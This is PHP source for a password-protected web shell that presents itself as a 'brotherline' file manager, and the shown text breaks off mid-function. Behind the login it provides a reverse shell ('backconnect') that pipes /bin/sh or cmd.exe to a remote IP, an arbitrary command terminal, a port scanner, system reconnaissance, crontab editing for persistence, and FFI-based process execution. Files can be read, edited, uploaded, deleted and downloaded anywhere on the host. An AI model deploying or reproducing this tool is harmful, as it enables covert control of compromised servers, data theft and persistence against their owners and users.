<?php
session_start();

// ===================== AUTH =====================
define('FM_PASSWORD', 'rusherinhere');

if (isset($_POST['fm_login'])) {
    if ($_POST['fm_password'] === FM_PASSWORD) {
        $_SESSION['fm_authed'] = true;
        header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
        exit;
    } else {
        $login_error = true;
    }
}

if (isset($_GET['fm_logout'])) {
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

if (empty($_SESSION['fm_authed'])) {
    $err = isset($login_error) ? true : false;
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>brotherline — Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Geist+Mono:wght@300;400;500;600&family=Geist:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; }
        body {
            background: #0a0c0f;
            font-family: 'Geist', system-ui, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        /* Animated grid background */
        body::before {
            content: '';
            position: fixed;
            inset: 0;
            background-image:
                linear-gradient(rgba(232,93,56,0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(232,93,56,0.03) 1px, transparent 1px);
            background-size: 40px 40px;
            pointer-events: none;
            z-index: 0;
        }

        /* Glow orb */
        body::after {
            content: '';
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 600px;
            height: 600px;
            background: radial-gradient(circle, rgba(232,93,56,0.06) 0%, transparent 65%);
            pointer-events: none;
            z-index: 0;
        }

        .login-card {
            position: relative;
            z-index: 1;
            background: #111318;
            border: 1px solid #1e2229;
            border-radius: 14px;
            padding: 44px 44px 36px;
            width: 380px;
            box-shadow: 0 24px 80px rgba(0,0,0,0.6), 0 0 0 1px rgba(232,93,56,0.04);
        }

        .login-logo {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 32px;
        }
        .login-logo-icon {
            width: 36px;
            height: 36px;
            background: rgba(232,93,56,0.12);
            border: 1px solid rgba(232,93,56,0.2);
            border-radius: 9px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #e85d38;
            font-size: 14px;
        }
        .login-logo-text {
            font-family: 'Geist Mono', monospace;
            font-size: 15px;
            font-weight: 600;
            color: #d4dae6;
            letter-spacing: -0.01em;
        }
        .login-logo-sub {
            font-size: 11px;
            color: #404858;
            font-family: 'Geist Mono', monospace;
            margin-top: 1px;
        }

        .login-title {
            font-size: 20px;
            font-weight: 600;
            color: #d4dae6;
            margin-bottom: 6px;
            letter-spacing: -0.02em;
        }
        .login-desc {
            font-size: 12.5px;
            color: #404858;
            margin-bottom: 28px;
            line-height: 1.5;
        }

        .input-group { margin-bottom: 16px; }
        .input-label {
            display: block;
            font-size: 11.5px;
            font-weight: 500;
            color: #606878;
            margin-bottom: 7px;
            letter-spacing: 0.02em;
        }
        .input-wrap {
            position: relative;
            display: flex;
            align-items: center;
        }
        .input-wrap i {
            position: absolute;
            left: 12px;
            color: #404858;
            font-size: 12px;
            pointer-events: none;
            transition: color 0.2s;
        }
        .pw-field {
            width: 100%;
            background: #0d1016;
            border: 1px solid #1e2229;
            border-radius: 8px;
            padding: 10px 40px 10px 36px;
            font-size: 13px;
            color: #d4dae6;
            font-family: 'Geist Mono', monospace;
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
            letter-spacing: 0.1em;
        }
        .pw-field::placeholder { letter-spacing: 0.02em; font-family: 'Geist', sans-serif; color: #2a3040; }
        .pw-field:focus { border-color: #e85d38; box-shadow: 0 0 0 3px rgba(232,93,56,0.1); }
        .pw-field:focus + .input-focus-icon, .input-wrap:focus-within i { color: #e85d38; }

        .eye-btn {
            position: absolute;
            right: 10px;
            background: none;
            border: none;
            color: #404858;
            cursor: pointer;
            padding: 4px;
            font-size: 12px;
            transition: color 0.15s;
        }
        .eye-btn:hover { color: #8a95a8; }

        .error-msg {
            display: flex;
            align-items: center;
            gap: 7px;
            background: rgba(232,93,56,0.08);
            border: 1px solid rgba(232,93,56,0.2);
            border-radius: 7px;
            padding: 9px 12px;
            font-size: 12px;
            color: #e85d38;
            margin-bottom: 16px;
            animation: shake 0.35s ease;
        }
        @keyframes shake {
            0%,100%{transform:translateX(0)}
            20%{transform:translateX(-5px)}
            40%{transform:translateX(5px)}
            60%{transform:translateX(-4px)}
            80%{transform:translateX(4px)}
        }

        .login-btn {
            width: 100%;
            background: #e85d38;
            border: none;
            border-radius: 8px;
            padding: 11px;
            font-size: 13.5px;
            font-weight: 600;
            color: #fff;
            cursor: pointer;
            font-family: 'Geist', sans-serif;
            letter-spacing: 0.01em;
            transition: all 0.2s;
            margin-top: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .login-btn:hover { background: #f07a5c; transform: translateY(-1px); box-shadow: 0 6px 20px rgba(232,93,56,0.3); }
        .login-btn:active { transform: translateY(0); box-shadow: none; }

        .login-footer {
            text-align: center;
            margin-top: 24px;
            font-size: 11px;
            color: #252d38;
            font-family: 'Geist Mono', monospace;
        }

        /* Scanline effect on card */
        .login-card::after {
            content: '';
            position: absolute;
            inset: 0;
            border-radius: 14px;
            background: repeating-linear-gradient(
                0deg,
                transparent,
                transparent 2px,
                rgba(255,255,255,0.005) 2px,
                rgba(255,255,255,0.005) 4px
            );
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="login-logo">
            <div class="login-logo-icon"><i class="fas fa-terminal"></i></div>
            <div>
                <div class="login-logo-text">brotherline</div>
                <div class="login-logo-sub">/ file-manager</div>
            </div>
        </div>

        <div class="login-title">Access Required</div>
        <div class="login-desc">Enter your password to continue to the file manager.</div>

        <?php if ($err): ?>
        <div class="error-msg">
            <i class="fas fa-exclamation-circle"></i>
            Incorrect password. Try again.
        </div>
        <?php endif; ?>

        <form method="POST" action="" autocomplete="off">
            <input type="hidden" name="fm_login" value="1" />
            <div class="input-group">
                <label class="input-label">PASSWORD</label>
                <div class="input-wrap">
                    <i class="fas fa-lock"></i>
                    <input class="pw-field" type="password" name="fm_password" id="pwInput"
                           placeholder="Enter password" autofocus />
                    <button type="button" class="eye-btn" id="eyeBtn" tabindex="-1">
                        <i class="fas fa-eye" id="eyeIcon"></i>
                    </button>
                </div>
            </div>
            <button type="submit" class="login-btn">
                <i class="fas fa-sign-in-alt"></i> Sign In
            </button>
        </form>

        <div class="login-footer">© brotherline · unauthorized access prohibited</div>
    </div>

    <script>
        const pw = document.getElementById('pwInput');
        const eyeBtn = document.getElementById('eyeBtn');
        const eyeIcon = document.getElementById('eyeIcon');
        eyeBtn.addEventListener('click', function() {
            const show = pw.type === 'password';
            pw.type = show ? 'text' : 'password';
            eyeIcon.className = show ? 'fas fa-eye-slash' : 'fas fa-eye';
        });
        // Press Enter to submit
        pw.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') this.form.submit();
        });
    </script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"/>
</body>
</html>
<?php
    exit;
}
// ===================== END AUTH =====================

if (isset($_REQUEST['action'])) {
    $action = $_REQUEST['action'];
    switch ($action) {
        // --- System & Tools ---
        case 'get_stats':
            handleGetStats();
            break;
        case 'adminer':
            handleAdminer();
            break;
        case 'port_scan':
            handlePortScan();
            break;
        case 'linux_exploit_suggester':
            handleLinuxExploitSuggester();
            break;
        case 'backconnect':
            handleBackconnect();
            break;
        case 'cron_manager':
            handleCronManager();
            break;
        case 'terminal':
            handleTerminal();
            break;

        // --- File Manager Actions ---
        case 'list':
            handleListFiles();
            break;
        case 'chdir':
            handleChdir();
            break;
        case 'create-dir':
        case 'create-file':
            handleCreateItem($action);
            break;
        case 'delete':
            handleDeleteItem();
            break;
        case 'rename':
            handleRenameItem();
            break;
        case 'chmod':
            handleChangePermissions();
            break;
        case 'get-content':
            handleGetFileContent();
            break;
        case 'save-content':
            handleSaveFileContent();
            break;
        case 'download':
            handleDownloadFile();
            break;
        case 'upload-file':
            handleUploadFiles();
            break;
        case 'bulk-delete':
            handleBulkDelete();
            break;
        case 'bulk-chmod':
            handleBulkChmod();
            break;
        case 'bulk-download':
            handleBulkDownload();
            break;

        default:
            send_error('Invalid action specified.');
            break;
    }
    exit;
}

// =================================================================
// ACTION HANDLER FUNCTIONS
// =================================================================

function handleGetStats()
{
    header('Content-Type: application/json');

    function get_server_cpu_load()
    {
        if (function_exists('sys_getloadavg')) {
            $load = sys_getloadavg();
            return $load[0];
        }
        return 'N/A';
    }

    $disk_total = @disk_total_space('/');
    $disk_free = @disk_free_space('/');
    $disk_used = $disk_total - $disk_free;
    $disk_percent = ($disk_total > 0) ? ($disk_used / $disk_total) * 100 : 0;

    $stats = [
        'user' => function_exists('get_current_user') ? get_current_user() : 'N/A',
        'php_version' => phpversion(),
        'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
        'cpu_load' => get_server_cpu_load(),
        'disk' => [
            'total' => round($disk_total / (1024 * 1024 * 1024), 2),
            'used' => round($disk_used / (1024 * 1024 * 1024), 2),
            'percent' => round($disk_percent, 2),
        ]
    ];

    echo json_encode($stats);
}

function handleAdminer()
{
    $adminer_file = 'adminer.php';
    $adminer_url = 'https://www.adminer.org/latest.php';
    if (!file_exists($adminer_file)) {
        $adminer_content = @file_get_contents($adminer_url);
        if ($adminer_content === false) {
            header('Content-Type: text/html; charset=utf-8');
            echo "<h3>Gagal Mengunduh Adminer</h3>";
            echo "<p>Silakan unduh <code>adminer.php</code> secara manual dari situs resminya dan unggah ke direktori ini.</p>";
            exit;
        }
        file_put_contents($adminer_file, $adminer_content);
    }
    include $adminer_file;
}

function handlePortScan()
{
    header('Content-Type: application/json');
    $data = json_decode(file_get_contents('php://input'), true);
    $host = $data['host'] ?? '';
    $ports_str = $data['ports'] ?? '21,22,80,443,3306';
    $timeout = $data['timeout'] ?? 1;

    if (empty($host) || filter_var($host, FILTER_VALIDATE_DOMAIN, FILTER_FLAG_HOSTNAME) === false && filter_var($host, FILTER_VALIDATE_IP) === false) {
        send_error('Host is required or invalid.');
    }

    $ports_to_scan = [];
    foreach (explode(',', $ports_str) as $part) {
        $part = trim($part);
        if (strpos($part, '-') !== false) {
            list($start, $end) = explode('-', $part);
            if (is_numeric($start) && is_numeric($end)) {
                for ($i = intval($start); $i <= intval($end); $i++) {
                    $ports_to_scan[] = $i;
                }
            }
        } elseif (is_numeric($part)) {
            $ports_to_scan[] = intval($part);
        }
    }

    $open_ports = [];
    foreach (array_unique($ports_to_scan) as $port) {
        $connection = @fsockopen($host, $port, $errno, $errstr, $timeout);
        if (is_resource($connection)) {
            $open_ports[] = $port;
            fclose($connection);
        }
    }
    send_success(['host' => $host, 'open_ports' => $open_ports, 'scanned_ports' => $ports_to_scan]);
}

function handleLinuxExploitSuggester()
{
    header('Content-Type: application/json');
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        send_error("This tool is for Linux servers only.");
    }
    $commands = [
        'Kernel Version' => 'uname -a',
        'Distribution'   => 'lsb_release -a 2>/dev/null || cat /etc/*-release 2>/dev/null || cat /etc/issue 2>/dev/null',
        'Proc Version'   => 'cat /proc/version'
    ];
    $results = [];
    foreach ($commands as $label => $command) {
        $results[$label] = htmlspecialchars(safe_exec($command));
    }
    send_success(['results' => $results]);
}

function handleBackconnect()
{
    header('Content-Type: application/json');
    $data = json_decode(file_get_contents('php://input'), true);
    $ip = $data['ip'] ?? '';
    $port = intval($data['port'] ?? 0);

    if (empty($ip) || filter_var($ip, FILTER_VALIDATE_IP) === false) {
        send_error("Invalid IP address.");
    }
    if ($port <= 0 || $port > 65535) {
        send_error("Invalid port.");
    }

    set_time_limit(0);
    ignore_user_abort(true);
    session_write_close();

    $shell = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? 'cmd.exe' : '/bin/sh -i';
    $sock = @fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) {
        send_error("Failed to connect to $ip:$port. Error: $errstr ($errno)");
    }

    send_success(['message' => "Backconnect initiated to $ip:$port. Check your listener."]);
    if (function_exists('fastcgi_finish_request')) {
        fastcgi_finish_request();
    } else {
        ob_flush();
        flush();
    }

    $descriptorspec = [0 => $sock, 1 => $sock, 2 => $sock];
    $process = proc_open($shell, $descriptorspec, $pipes);
    if (is_resource($process)) {
        proc_close($process);
    }
    fclose($sock);
}

function handleCronManager()
{
    header('Content-Type: application/json');
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        send_error("Cron Manager is for Linux servers only.");
    }

    $data = json_decode(file_get_contents('php://input'), true);
    $sub_action = $data['sub_action'] ?? 'list';

    switch ($sub_action) {
        case 'list':
            $output = safe_exec('crontab -l 2>&1');
            send_success(['cron_jobs' => (strpos($output, 'no crontab for') !== false || empty($output)) ? '' : $output]);
            break;
        case 'save':
            $jobs = $data['jobs'] ?? '';
            $tmp_file = tempnam(sys_get_temp_dir(), 'cron');
            file_put_contents($tmp_file, $jobs . PHP_EOL);
            $output = safe_exec('crontab ' . escapeshellarg($tmp_file) . ' 2>&1');
            unlink($tmp_file);
            empty($output) ? send_success(['message' => 'Crontab updated successfully.']) : send_error('Failed to update crontab: ' . $output);
            break;
        default:
            send_error('Invalid Cron Manager action specified.');
            break;
    }
}

function handleTerminal()
{
    if (!isset($_SESSION['terminal_cwd'])) {
        $_SESSION['terminal_cwd'] = __DIR__;
    }
    $data = json_decode(file_get_contents('php://input'), true);
    $command = $data['cmd'] ?? '';
    $cwd = $_SESSION['terminal_cwd'];

    if (preg_match('/^cd\s*(.*)$/', $command, $matches)) {
        $new_dir_str = trim($matches[1]);
        $new_dir_str = trim($new_dir_str, "\"'");
        $output = '';

        if (empty($new_dir_str) || $new_dir_str === '~') {
            $target_path = __DIR__;
        } else {
            $is_absolute = (DIRECTORY_SEPARATOR === '/' && substr($new_dir_str, 0, 1) === '/') ||
                (DIRECTORY_SEPARATOR === '\\' && preg_match('/^[a-zA-Z]:/', $new_dir_str));
            $target_path = $is_absolute ? $new_dir_str : $cwd . DIRECTORY_SEPARATOR . $new_dir_str;
        }

        $real_target_path = realpath($target_path);

        if ($real_target_path && is_dir($real_target_path)) {
            $_SESSION['terminal_cwd'] = $real_target_path;
        } else {
            $output = "cd: no such file or directory: " . htmlspecialchars($new_dir_str);
        }

        header('Content-Type: application/json');
        echo json_encode(['output' => $output]);
        exit;
    } elseif (!empty($command)) {
        while (ob_get_level()) {
            ob_end_flush();
        }

        header('Content-Type: text/plain; charset=UTF-8');
        header('X-Content-Type-Options: nosniff');

        session_write_close();
        set_time_limit(0);

        $is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
        $cd_command = $is_windows ? 'cd /d' : 'cd';

        $full_command = $cd_command . ' ' . escapeshellarg($cwd) . ' && ' . $command;

        $descriptorspec = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"]
        ];

        $process = proc_open($full_command, $descriptorspec, $pipes);

        if (is_resource($process)) {
            fclose($pipes[0]);

            stream_set_blocking($pipes[1], false);
            stream_set_blocking($pipes[2], false);

            while (true) {
                $status = proc_get_status($process);
                if (!$status['running']) {
                    break;
                }

                $read_streams = [$pipes[1], $pipes[2]];
                $write_streams = null;
                $except_streams = null;

                if (stream_select($read_streams, $write_streams, $except_streams, 0, 200000) > 0) {
                    foreach ($read_streams as $stream) {
                        $output = fread($stream, 8192);
                        if ($output !== false && strlen($output) > 0) {
                            echo $output;
                            flush();
                        }
                    }
                }
            }

            $stdout_remains = stream_get_contents($pipes[1]);
            if ($stdout_remains) {
                echo $stdout_remains;
                flush();
            }
            $stderr_remains = stream_get_contents($pipes[2]);
            if ($stderr_remains) {
                echo $stderr_remains;
                flush();
            }

            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
        }
        exit;
    } else {
        header('Content-Type: application/json');
        echo json_encode(['output' => '']);
        exit;
    }
}


// =================================================================
// FILE MANAGER HANDLERS
// =================================================================
function get_fm_config()
{
    $root_dir = dirname($_SERVER['DOCUMENT_ROOT']);
    define('DOC_ROOT', realpath($root_dir) ?: realpath(__DIR__));

    if (!isset($_SESSION['fm_cwd'])) {
        $_SESSION['fm_cwd'] = DOC_ROOT;
    }
}

function handleListFiles()
{
    get_fm_config();
    list_files($_SESSION['fm_cwd']);
}

function handleChdir()
{
    get_fm_config();
    $target_path = $_REQUEST['target_path'] ?? '';
    $current_cwd = $_SESSION['fm_cwd'];
    $new_full_path = '';

    $is_absolute = (DIRECTORY_SEPARATOR === '/' && substr($target_path, 0, 1) === '/') ||
        (DIRECTORY_SEPARATOR === '\\' && preg_match('/^[a-zA-Z]:/', $target_path));

    if ($target_path === '..') {
        $new_full_path = realpath($current_cwd . DIRECTORY_SEPARATOR . '..');
    } elseif (empty($target_path)) {
        $new_full_path = DOC_ROOT;
    } elseif ($is_absolute) {
        if (DIRECTORY_SEPARATOR === '\\' && preg_match('/^[a-zA-Z]:$/', $target_path)) {
            $target_path .= '\\';
        }
        $new_full_path = realpath($target_path);
    } else {
        $new_full_path = realpath($current_cwd . DIRECTORY_SEPARATOR . $target_path);
    }

    if ($new_full_path === false) {
        send_error('Invalid path specified or path does not exist: ' . htmlspecialchars($target_path));
    }

    if (is_dir($new_full_path)) {
        $_SESSION['fm_cwd'] = $new_full_path;
        list_files($new_full_path);
    } else {
        send_error('Failed to change directory or target is not a directory.');
    }
}

function get_validated_filepath($name_from_request)
{
    get_fm_config();
    $name = basename($name_from_request);
    $file_path = $_SESSION['fm_cwd'] . DIRECTORY_SEPARATOR . $name;

    if (!file_exists($file_path)) {
        send_error('Invalid path specified or file not found.');
    }
    return $file_path;
}

function handleCreateItem($action)
{
    get_fm_config();
    $name = $_POST['name'] ?? '';
    if ($action === 'create-dir') {
        create_directory($_SESSION['fm_cwd'], $name);
    } else {
        create_file($_SESSION['fm_cwd'], $name);
    }
}

function handleDeleteItem()
{
    $item_path = get_validated_filepath($_POST['name'] ?? '');
    delete_item_recursive($item_path);
    send_success(['message' => 'Item berhasil dihapus.']);
}

function handleRenameItem()
{
    get_fm_config();
    $old_name = basename($_POST['old_name'] ?? '');
    $new_name = basename($_POST['new_name'] ?? '');
    rename_item($_SESSION['fm_cwd'], $old_name, $new_name);
}

function handleChangePermissions()
{
    $item_path = get_validated_filepath($_POST['name'] ?? '');
    $perms = $_POST['perms'] ?? '';
    change_permissions($item_path, $perms);
}

function handleGetFileContent()
{
    $file_path = get_validated_filepath($_GET['name'] ?? '');
    get_file_content($file_path);
}

function handleSaveFileContent()
{
    $file_path = get_validated_filepath($_POST['name'] ?? '');
    $content = $_POST['content'] ?? '';
    save_file_content($file_path, $content);
}

function handleDownloadFile()
{
    $file_path = get_validated_filepath($_GET['name'] ?? '');
    download_file($file_path);
}

function handleUploadFiles()
{
    get_fm_config();
    upload_files($_SESSION['fm_cwd']);
}

function handleBulkDelete()
{
    get_fm_config();
    $items = json_decode($_POST['items'] ?? '[]', true);
    bulk_delete($_SESSION['fm_cwd'], $items);
}

function handleBulkChmod()
{
    get_fm_config();
    $items = json_decode($_POST['items'] ?? '[]', true);
    $perms = $_POST['perms'] ?? '';
    bulk_chmod($_SESSION['fm_cwd'], $items, $perms);
}

function handleBulkDownload()
{
    get_fm_config();
    $items = json_decode($_GET['items'] ?? '[]', true);
    bulk_download($_SESSION['fm_cwd'], $items);
}

// =================================================================
// HELPER & CORE FUNCTIONS
// =================================================================

function safe_exec($command)
{
    $isWindows = (stripos(PHP_OS, "WIN") === 0);

    if ($isWindows) {
        if (PHP_VERSION_ID >= 70400 && extension_loaded("FFI")) {
            $ffi = FFI::cdef("
                typedef int BOOL;
                typedef void* HANDLE;
                typedef unsigned long DWORD;
                typedef const wchar_t* LPCWSTR;

                typedef struct _STARTUPINFOW {
                    DWORD cb;
                    LPCWSTR lpReserved;
                    LPCWSTR lpDesktop;
                    LPCWSTR lpTitle;
                    DWORD dwX;
                    DWORD dwY;
                    DWORD dwXSize;
                    DWORD dwYSize;
                    DWORD dwXCountChars;
                    DWORD dwYCountChars;
                    DWORD dwFillAttribute;
                    DWORD dwFlags;
                    WORD wShowWindow;
                    WORD cbReserved2;
                    BYTE* lpReserved2;
                    HANDLE hStdInput;
                    HANDLE hStdOutput;
                    HANDLE hStdError;
                } STARTUPINFOW;

                typedef struct _PROCESS_INFORMATION {
                    HANDLE hProcess;
                    HANDLE hThread;
                    DWORD dwProcessId;
                    DWORD dwThreadId;
                } PROCESS_INFORMATION;

                BOOL CreateProcessW(
                    LPCWSTR lpApplicationName,
                    LPCWSTR lpCommandLine,
                    void* lpProcessAttributes,
                    void* lpThreadAttributes,
                    BOOL bInheritHandles,
                    DWORD dwCreationFlags,
                    void* lpEnvironment,
                    LPCWSTR lpCurrentDirectory,
                    STARTUPINFOW* lpStartupInfo,
                    PROCESS_INFORMATION* lpProcessInformation
                );
            ", "kernel32.dll");

            $si = $ffi->new("STARTUPINFOW");
            $pi = $ffi->new("PROCESS_INFORMATION");
            $si->cb = FFI::sizeof($si);

            $wcmd = FFI::new("wchar_t[512]");
            FFI::memcpy(
                $wcmd,
                FFI::string("cmd.exe /c " . $command),
                2 * strlen("cmd.exe /c " . $command)
            );

            $res = $ffi->CreateProcessW(
                null,
                $wcmd,
                null,
                null,
                0,
                0,
                null,
                null,
                FFI::addr($si),
                FFI::addr($pi)
            );

            return $res
                ? "Process started (PID: " . $pi->dwProcessId . ")"
                : "Failed to execute via CreateProcessW";
        } else {
            $descriptorspec = [
                0 => ["pipe", "r"],
                1 => ["pipe", "w"],
                2 => ["pipe", "w"]
            ];
            $process = proc_open($command, $descriptorspec, $pipes);
            $output = '';

            if (is_resource($process)) {
                fclose($pipes[0]);
                $output = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
            }
            return $output;
        }
    } else {
        $descriptorspec = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"]
        ];

        $process = proc_open($command, $descriptorspec, $pipes);
        $output = '';

        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
        }

        return $output;
    }
}

function send_error($message, $status_code = 400)
{
    header('Content-Type: application/json');
    http_response_code($status_code);
    echo json_encode(['success' => false, 'message' => $message]);
    exit;
}

function send_success($data = [])
{
    header('Content-Type: application/json');
    echo json_encode(array_merge(['success' => true], $data));
    exit;
}

function list_files($dir)
{
    if (!is_dir($dir)) send_error('Directory not found.');

    $files = [];
    $items = @scandir($dir);
    if ($items === false) send_error('Could not read directory. Check permissions.');

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;

        $item_path = $dir . DIRECTORY_SEPARATOR . $item;
        $is_dir = is_dir($item_path);
        $files[] = [
            'name' => $item,
            'type' => $is_dir ? 'folder' : 'file',
            'size' => $is_dir ? '-' : format_size(@filesize($item_path)),
            'last_modified' => date('Y-m-d H:i:s', @filemtime($item_path)),
            'permissions' => substr(sprintf('%o', @fileperms($item_path)), -4),
        ];
    }

    usort($files, function ($a, $b) {
        if ($a['type'] === 'folder' && $b['type'] !== 'folder') return -1;
        if ($a['type'] !== 'folder' && $b['type'] === 'folder') return 1;
        return strcasecmp($a['name'], $b['name']);
    });

    $display_path = str_replace(DOC_ROOT, '', $dir) ?: '/';

    $response_data = [
        'files' => $files,
        'path' => $display_path,
        'breadcrumbs' => generate_breadcrumbs($dir)
    ];

    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        $drives = [];
        foreach (range('A', 'Z') as $drive) {
            if (is_dir($drive . ':\\')) {
                $drives[] = ['name' => $drive . ':', 'path' => $drive . ':\\'];
            }
        }
        $response_data['drives'] = $drives;
    }

    send_success($response_data);
}

function create_directory($path, $name)
{
    if (empty($name) || preg_match('/[\\/\:\*\?"<>\|]/', $name)) send_error('Invalid directory name.');
    $new_dir = $path . DIRECTORY_SEPARATOR . $name;
    if (file_exists($new_dir)) send_error('Directory already exists.');
    if (@mkdir($new_dir)) send_success(['message' => 'Directory created successfully.']);
    else send_error('Failed to create directory. Check permissions.');
}

function create_file($path, $name)
{
    if (empty($name) || preg_match('/[\\/\:\*\?"<>\|]/', $name)) send_error('Invalid file name.');
    $new_file = $path . DIRECTORY_SEPARATOR . $name;
    if (file_exists($new_file)) send_error('File already exists.');
    if (@touch($new_file)) send_success(['message' => 'File created successfully.']);
    else send_error('Failed to create file. Check permissions.');
}

function delete_item_recursive($item_path)
{
    if (is_dir($item_path)) {
        $it = new RecursiveDirectoryIterator($item_path, RecursiveDirectoryIterator::SKIP_DOTS);
        $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
        foreach ($files as $file) {
            $realPath = $file->getRealPath();
            $file->isDir() ? @rmdir($realPath) : @unlink($realPath);
        }
        @rmdir($item_path);
    } else {
        @unlink($item_path);
    }
}

function rename_item($path, $old_name, $new_name)
{
    if (empty($new_name) || preg_match('/[\\/\:\*\?"<>\|]/', $new_name)) send_error('Invalid new name.');
    $old_path = $path . DIRECTORY_SEPARATOR . $old_name;
    $new_path = $path . DIRECTORY_SEPARATOR . $new_name;
    if (!file_exists($old_path)) send_error('Original item not found.');
    if (file_exists($new_path)) send_error('An item with the new name already exists.');
    if (rename($old_path, $new_path)) send_success(['message' => 'Berhasil diubah nama.']);
    else send_error('Failed to rename. Check permissions.');
}

function change_permissions($item_path, $perms)
{
    if (!preg_match('/^[0-7]{4}$/', $perms)) send_error('Invalid permission format. Use a 4-digit octal value (e.g., 0755).');
    if (@chmod($item_path, octdec($perms))) send_success(['message' => 'Permissions changed successfully.']);
    else send_error('Failed to change permissions.');
}

function get_file_content($file_path)
{
    if (!is_file($file_path)) send_error('File not found.');
    $content = @file_get_contents($file_path);
    if ($content === false) send_error('Could not read file content.');
    else send_success(['content' => $content]);
}

function save_file_content($file_path, $content)
{
    if (!is_file($file_path)) send_error('File not found.');
    if (@file_put_contents($file_path, $content) !== false) send_success(['message' => 'File saved successfully.']);
    else send_error('Failed to save file. Check permissions.');
}

function download_file($file_path)
{
    if (is_file($file_path)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_path));
        flush();
        readfile($file_path);
        exit;
    } else {
        http_response_code(404);
        die('File not found.');
    }
}

function upload_files($path)
{
    if (empty($_FILES['files_to_upload'])) {
        send_error('Tidak ada file yang dipilih untuk diunggah.');
    }
    $files = $_FILES['files_to_upload'];
    $errors = [];
    $success_count = 0;
    $file_count = is_array($files['name']) ? count($files['name']) : 1;

    for ($i = 0; $i < $file_count; $i++) {
        $name = is_array($files['name']) ? $files['name'][$i] : $files['name'];
        $tmp_name = is_array($files['tmp_name']) ? $files['tmp_name'][$i] : $files['tmp_name'];
        $error = is_array($files['error']) ? $files['error'][$i] : $files['error'];

        if ($error !== UPLOAD_ERR_OK) {
            $errors[] = "$name (Error code: $error)";
            continue;
        }
        $file_name = basename($name);
        if (preg_match('/[\\/\:\*\?"<>\|]/', $file_name)) {
            $errors[] = "$file_name (Invalid characters in name)";
            continue;
        }
        $destination = $path . DIRECTORY_SEPARATOR . $file_name;
        if (file_exists($destination)) {
            $errors[] = "$file_name (File already exists)";
            continue;
        }
        if (move_uploaded_file($tmp_name, $destination)) {
            $success_count++;
        } else {
            $errors[] = "$file_name (Failed to move, check folder permissions)";
        }
    }

    if ($success_count > 0 && empty($errors)) {
        send_success(['message' => "$success_count file(s) uploaded successfully."]);
    } elseif ($success_count > 0) {
        send_error("Uploaded $success_count file(s), but failed for: " . implode(', ', $errors));
    } else {
        send_error('Upload failed. Errors: ' . implode(', ', $errors));
    }
}

function bulk_delete($path, $items)
{
    if (empty($items)) send_error('No items selected.');
    $errors = [];
    foreach ($items as $item_name) {
        $item_path = $path . DIRECTORY_SEPARATOR . basename($item_name);
        if (file_exists($item_path)) {
            delete_item_recursive($item_path);
        } else {
            $errors[] = $item_name;
        }
    }
    if (empty($errors)) send_success(['message' => count($items) . ' items deleted.']);
    else send_error('Could not delete: ' . implode(', ', $errors));
}

function bulk_chmod($path, $items, $perms)
{
    if (empty($items)) send_error('No items selected.');
    if (!preg_match('/^[0-7]{4}$/', $perms)) send_error('Invalid permission format.');
    $octal_perms = octdec($perms);
    $errors = [];
    foreach ($items as $item_name) {
        $item_path = $path . DIRECTORY_SEPARATOR . basename($item_name);
        if (file_exists($item_path) && !@chmod($item_path, $octal_perms)) {
            $errors[] = $item_name;
        }
    }
    if (empty($errors)) send_success(['message' => 'Permissions changed for ' . count($items) . ' items.']);
    else send_error('Could not change permissions for: ' . implode(', ', $errors));
}

function bulk_download($path, $items)
{
    if (!class_exists('ZipArchive')) send_error('ZipArchive class is not available.');
    if (empty($items)) send_error('No items selected for download.');

    $zip = new ZipArchive();
    $zip_name = 'download_' . time() . '.zip';
    $zip_path = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $zip_name;

    if ($zip->open($zip_path, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
        send_error('Cannot create zip archive.');
    }

    foreach ($items as $item_name) {
        $item_path = $path . DIRECTORY_SEPARATOR . basename($item_name);
        if (file_exists($item_path)) {
            if (is_file($item_path)) {
                $zip->addFile($item_path, basename($item_name));
            } elseif (is_dir($item_path)) {
                $files = new RecursiveIteratorIterator(
